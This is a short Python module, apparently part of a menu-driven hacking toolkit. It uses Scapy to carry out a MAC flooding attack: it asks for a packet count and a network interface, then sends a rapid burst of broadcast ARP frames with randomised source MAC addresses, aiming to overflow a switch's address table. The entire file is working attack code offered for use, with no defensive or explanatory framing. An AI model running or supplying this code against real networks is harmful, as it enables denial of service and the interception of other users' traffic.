from scapy.all import *
from Modules import intro

class Mac_Attack():
      def __init__(self):
            print("""
            1 - Attack 
            99 - Back
            """)

            self.Number = str(input("[?]>>"))
            if self.Number == str(1) :

                  self.packet = int(input("Enter the number of packets >> "))
                  self.interface = str(input("Enter the Interface >>"))
                  self.arp_pkt = ARP(pdst='2.2.255.255',hwdst="ff:ff:ff:ff:ff:ff")
                  self.eth_pkt = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
                  try:
                        sendp(self.eth_pkt/self.arp_pkt,iface=self.interface,count =self.packet, inter= .001)
                  except :               
                        print("Destination Unreachable ")
            if self.Number == str(99) or "back" in self.Number :
                  intro.main()